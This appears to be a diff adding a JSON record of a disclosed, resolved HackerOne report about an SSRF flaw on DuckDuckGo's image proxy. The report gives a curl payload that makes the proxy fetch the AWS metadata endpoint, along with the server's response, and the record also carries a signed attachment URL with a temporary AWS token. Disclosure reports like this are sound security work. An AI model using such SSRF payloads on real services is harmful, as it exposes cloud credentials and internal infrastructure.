@@ -1,0 +1,129 @@
+{
+  "id": 395521,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTU1MjE=",
+  "url": "https://hackerone.com/reports/395521",
+  "title": "SSRF vulnerability on proxy.duckduckgo.com (access to metadata server on AWS)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-08-15T15:29:26.630Z",
+  "submitted_at": "2018-08-15T15:29:26.630Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "cujanovic",
+    "url": "/cujanovic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/005/382/ff3eef97a8a4c4aa0f46b834454237dcf9d7e9b5_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 10995,
+    "url": "https://hackerone.com/duckduckgo",
+    "handle": "duckduckgo",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4mpaehke5u0ubioeqvys0hcesjle/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/4mpaehke5u0ubioeqvys0hcesjle/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "DuckDuckGo",
+      "twitter_handle": "duckduckgo",
+      "website": "https://duckduckgo.com",
+      "about": "Independent online protection company. Get our mobile & desktop browser with protections built-in, including our search engine that doesn’t track you."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-10-31T17:33:34.738Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-10-22T10:36:06.642Z",
+  "team_member_agreed_on_going_public_at": "2018-10-31T17:33:34.673Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello, I saw that SSRF on proxy.duckduckgo.com is out of scope but because of the severity I wanted to report this.\nThe payload is simple: \n```curl \"https://proxy.duckduckgo.com/iur/?f=1&image_host=http://169.254.169.254/latest/meta-data/\"```\n\nResponse from the server:\n```ami-id\nami-launch-index\nami-manifest-path\nblock-device-mapping/\nhostname\ninstance-action\ninstance-id\ninstance-type\nlocal-hostname\nlocal-ipv4\nmac\nmetrics/\nnetwork/\nplacement/\nprofile\npublic-hostname\npublic-ipv4\npublic-keys/\nreservation-id\nsecurity-groups\nservices/```\n\n## Impact\n\naccess information on internal AWS metadata server.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 333785,
+      "file_name": "ddg.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/333/785/d0b5c47cc9aaf58e94f08d29160f0f5627cdb630/ddg.png?response-content-disposition=attachment%3B%20filename%3D%22ddg.png%22%3B%20filename%2A%3DUTF-8%27%27ddg.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUA5QK5VM%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T021321Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIHm3btGgzlHis%2F9oOvDESSVePwMxPk4gaBS9iNiFviM3AiAPW4u6lqAH6O3yHvm7bIIcgWVWFnqYsbO0u9JBe7yUiyq6BQii%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMcnYPosg7URHoCiAsKo4FadOTpgQUOQsra9GYh96WIhzwAyOBNd2Vt3Qec%2Fgp%2B%2BaVGBiAlxfSNPk0%2B%2FweLcmJgii%2FHxEMBtCNDKrMUaCY3jeLGrOxGdGHFHjYQ%2FUJkquobacRE1k%2BJThpoeED3m2iXLcBxl9Du3ilY%2FKiM1%2FLXbxvbp9oTVeu02rdo6WYQ%2F0hcawgggpwf7BdaW93ZiAFSGA%2BksIxFjkaMdv59JJtHuZ9xgoR4iinarwKFEGcwr76Ewo9gzOw98MP%2F%2F6BiL6rn48yiqGKW6r9Y1%2Bu%2BbXRQD%2Fh4OE7ZWwMJ9D61y7BcO9GlqvKSD013lVN%2Be8mnjapPA3llc00y13lavGRw1XJ8Yweb5JiEltZLNYD7U97UVkJXQ4qTblffHxiSAQSu3cwynw1NxYipJuPpK8ICludkl3%2F3w95uDuKJCKw6xYQ%2FXWVEtAHmnfRwzLz%2Fg0xdlLrvdgiEl5DImy3dUYnFxKg1esN%2FPHm3EmaEb95rMYIkVNzU0ibZAbq5s%2F7LH4i4%2BVzplxFDT0gt4%2FfqBVYADFq8c7kZhMZS5PZcFpxExJL8ztuU85PQTy7Sngh9zHB4Vr3tpIidd6CYDF8fner5noNOTeTzsDIVVEK1bIk8%2F1t6pt7z%2BPqwk2ormCBJshSUZ8lI0yAGafaEXj1p5LktF6ry161%2FUy1nhHgg0UIZBUJ8HweWcKKTOHlohRrttZTgDRaz8VqzrswkkNsT%2FhGJ6sTmHmyyM4FPMCOobHO9lSPW%2BPmfcO4%2FJcYtJjeJrH684CXmkZ5AScck8adSGeCv0R6BBHWWD7XmbAYtvjKhQDKfBklp%2F8FstDxGlobJdfOHqRp08VYyhx9eE9h1glcQBTJmdRj%2F8vBKDdpydb2gRxAMLiO5MwGOrIBiYUQSOFVSboEO4%2FCyL%2Bphoe1fcxLtPOyCw92kU%2Bs971KDYauREWX6iVasq0gazDHhU4lmu43NhxOAgDU9Nmy8eGu8eMeAs49rQngMUfJpgZ9ANH00W3o89h68qQo3G08UZm5U%2BZIFnekRLGUfq2OlwlVboT4Tjz7Xu3H49YLJZ%2BlqEGjxU1jWst7Bco8nAvwITl21SekSNbSzK0fNDZ1V2mQeqPwPLtJ1mAAw0KGfZsneA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5ed8b33d15d3d65b6d645cce038aa51266a021c29587c72bd8b3882727f39c68",
+      "file_size": 55185,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-11-21T10:36:06.695Z",
+  "allow_singular_disclosure_after": -228843435.30226743,
+  "singular_disclosure_allowed": true,
+  "vote_count": 24,
+  "voters": [
+    "he4am",
+    "ras-it",
+    "spam404",
+    "theappsec",
+    "dhakal_bibek",
+    "whitesector",
+    "yusuf_furkan",
+    "eveeez",
+    "justas_b",
+    "cyberunit",
+    "and 14 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 8671,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.duckduckgo.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
